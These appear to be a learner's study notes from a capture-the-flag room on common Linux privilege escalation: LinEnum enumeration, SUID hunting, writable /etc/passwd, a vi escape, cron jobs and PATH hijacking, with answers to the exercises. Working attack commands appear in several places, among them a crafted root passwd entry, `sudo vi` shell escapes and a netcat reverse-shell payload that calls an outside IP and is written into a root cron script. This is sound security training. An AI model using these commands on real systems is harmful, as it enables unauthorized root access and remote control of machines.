# Common Linux Privesc


## Understanding Privesc
- Privelege Escalation - going from a lower permission to a higher permission
    - The exploitation of a vulnerability, design flaw or configuration oversight to gain unauthorized access to resources that are usually restricted from users
- Why is it important
    - Crucial because it lets you gain system admin levels of access
    - Reset passwords
    - Bypass access controls to compromise protected data
    - Edit software configurations
    - Enable persistence, so you can access the machine again later.
    - Change privilege of users
    - Get that cheeky root flag ;)

## Direction of Privilege Escalation
- ![Tree](Images/direction_of_privilege_escalation.png)
- Two main privilege escalation types
    - Horizontal privilege escalation
        - Expand your reach over the system by taking over a different user who is on the same privilege level as you
        - Allows you to inherit files and permissions as that user
        - Ex. Gain access to another normal privilege user that happens to have an SUID file attached to their home directory which can then be used to get super user access
    - Vertical privilege escalation
        - Gain higher privileges with an account that you have already compromised

## Enumeration
- [LinEnum](https://github.com/rebootuser/LinEnum)
    - Performs common commands related to privilege escalation
    - Understand what commands LinEnum executes so you can manually enumerate in situations where you're unable to use LinEnum or other scripts
- Get LinEnum on the target machine
    - Multiple ways
    1. Download LinEnum on your machine, open a web server with `python3 -m http.server <port>`, then use wget on the target machine to download the file, and make it executable with `chmod +x <file name>`
    2. Create a new file on the target machine and copy the raw LinEnum code into it, then use chmod to make it executable
- LinEnum output
```
Kernel Kernel information is shown here. There is most likely a kernel exploit available for this machine.

Can we read/write sensitive files: The world-writable files are shown below. These are the files that any authenticated user can read and write to. By looking at the permissions of these sensitive files, we can see where there is misconfiguration that allows users who shouldn't usually be able to, to be able to write to sensitive files.

SUID Files: The output for SUID files is shown here. There are a few interesting items that we will definitely look into as a way to escalate privileges. SUID (Set owner User ID up on execution) is a special type of file permissions given to a file. It allows the file to run with permissions of whoever the owner is. If this is root, it runs with root permissions. It can allow us to escalate privileges. 

Crontab Contents: The scheduled cron jobs are shown below. Cron is used to schedule commands at a specific time. These scheduled commands or tasks are known as “cron jobs”. Related to this is the crontab command which creates a crontab file containing commands and instructions for the cron daemon to execute. There is certainly enough information to warrant attempting to exploit Cronjobs here.
```
- Exercise
    1. polobox
    2. 8
    3. 4
    4. autoscript.sh
    5. /etc/passwd

## Abusing SUID/GUID Files
- Finding and Exploiting SUID Files
    - First step in Linux escalation exploitation is to check for file with SUID/GUID bit set
- SUID (Set User ID)
    - A special type of permission
    - `rws-rwx-rwx`
- GUID (Set Group ID)
    - `rwx-rws-rwx`
- Finding SUID Binaries
    - `find / -perm -u=s -type f 2>/dev/null`
- Exercise
    - Run `find / -perm -u=s -type f 2>/dev/null`
```
/sbin/mount.nfs
/sbin/mount.ecryptfs_private
/sbin/mount.cifs
/usr/sbin/pppd
/usr/bin/gpasswd
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/traceroute6.iputils
/usr/bin/chfn
/usr/bin/arping
/usr/bin/newgrp
/usr/bin/sudo
/usr/lib/xorg/Xorg.wrap
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/bin/ping
/bin/su
/bin/ntfs-3g
/bin/mount
/bin/umount
/bin/fusermount
/home/user5/script
/home/user3/shell
```
    1. /home/user3/shell

## Exploiting Writable /etc/passwd
- Understanding /etc/passwd
    - Stores essential information required during login
    - Contains a list of the system's accounts, with special information like user ID, group ID, home directory, shell, etc.
    - Should have general read permission because many utilities use it to map user IDs to usernames, but write permission should be limited to root
        - When write access is given to everyone or a user has been added to a write-allowed group, we have a vuln that can allow the creation of a root user that we can access
- Understanding the format
    - Contains one entry per line for each user account, separated by a :, and there are seven total fields
    - Ex. `test:x:0:0:root:/root:/bin/bash`
```
Username: It is used when user logs in. It should be between 1 and 32 characters in length.
Password: An x character indicates that encrypted password is stored in /etc/shadow file. Please note that you need to use the passwd command to compute the hash of a password typed at the CLI or to store/update the hash of the password in /etc/shadow file, in this case, the password hash is stored as an "x".
User ID (UID): Each user must be assigned a user ID (UID). UID 0 (zero) is reserved for root and UIDs 1-99 are reserved for other predefined accounts. Further UID 100-999 are reserved by system for administrative and system accounts/groups.
Group ID (GID): The primary group ID (stored in /etc/group file)
User ID Info: The comment field. It allow you to add extra information about the users such as user’s full name, phone number etc. This field use by finger command.
Home directory: The absolute path to the directory the user will be in when they log in. If this directory does not exists then users directory becomes /
Command/shell: The absolute path of a command or shell (/bin/bash). Typically, this is a shell. Please note that it does not have to be a shell.
```
- How to exploit it
    - If we have a writable /etc/passwd file, we can write a new line entry according to the above formula to create a new user
    - Add the password hash of our choice and set the UID, GID, and shell to root, allowing us to log in as our own root user
    - Use openssl to create a new password hash `openssl passwd -1 -salt [salt] [password]`
- Exercise
    1. Vertical
    2. `$1$new$p7ptkEKU1HnaHpRtzNizS1`
    3. Create a new user by appending this to /etc/passwd `new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash`

## Escaping Vi Editor
- Every time you have access to an account in a CTF make sure to use `sudo -l` to view what commands you're allowed to run as root without having the root password
- Using `sudo -l` on this machine shows us that we can run vi as root `(root) NOPASSWD: /usr/bin/vi`
- If you find a misconfigured binary, a good place to look to see how you can exploit them is [GTFOBin](https://gtfobins.github.io/)
- Now use this to create a new shell with vi as root `sudo vi -c ':!/bin/sh'`

## Exploiting Crontab
- Use `cat /etc/crontab` to see which jobs are scheduled
Cronjobs exist in a certain format, being able to read that format is important if you want to exploit a cron job. 
- Format
```
# = ID
m = Minute
h = Hour
dom = Day of the month
mon = Month
dow = Day of the week
user = What user the command will run as
command = What command should be run

Ex.
#  m   h dom mon dow user  command
17 *   1  *   *   *  root  cd / && run-parts --report /etc/cron.hourly
```
- To exploit cron jobs, see if the program is being run as root. If it is, check if you have write permission on that program or any programs being called inside that program
- Exercise
    - Create a payload with msfvenom `msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R` to get `mkfifo /tmp/qbwebbr; nc <ip address> 8888 0</tmp/qbwebbr | /bin/sh >/tmp/qbwebbr 2>&1; rm /tmp/qbwebbr`
    1. `/home/user4/Desktop`
    - Overwrite autoscript.sh with payload `echo "mkfifo /tmp/qbwebbr; nc 10.13.22.138 8888 0</tmp/qbwebbr | /bin/sh >/tmp/qbwebbr 2>&1; rm /tmp/qbwebbr" > autoscript.sh`
    - Set up a netcat listener `nc -nvlp 8888` and wait for cron to execute autoscript.sh as root

## Exploiting the PATH Variable
- PATH is an environmental variable in Linux and Unix-like operating systems which specifies directories that hold executable programs. When the user runs any command in the terminal, it searches for executable files with the help of the PATH Variable in response to commands executed by a user.
- View variable with `echo $PATH`
```
Let's say we have an SUID binary. Running it, we can see that it’s calling the system shell to do a basic process like list processes with "ps". Unlike in our previous SUID example, in this situation we can't exploit it by supplying an argument for command injection, so what can we do to try and exploit this?

We can re-write the PATH variable to a location of our choosing! So when the SUID binary calls the system shell to run an executable, it runs one that we've written instead!

As with any SUID file, it will run this command with the same privileges as the owner of the SUID file! If this is root, using this method we can run whatever commands we like as root!
```
- Exercise
    1. ls
    - `cd /tmp` and create an intimation executable with `echo "[whatever command we want to run]" > [name of the executable we're imitating]`
    2. Create intimation executable with `echo "/bin/bash" > ls`
    3. Make it executable with `chmod +x ls`
    - Change the path with `export PATH=/tmp:$PATH`
    4. Change the path variable to point to where we have our intimation variable with `export PATH=/tmp:$PATH`
    5. Run the script executable again and now you'll be promoted to root

## Expanding Your Knowledge
```
https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html
https://payatu.com/guide-linux-privilege-escalation
```
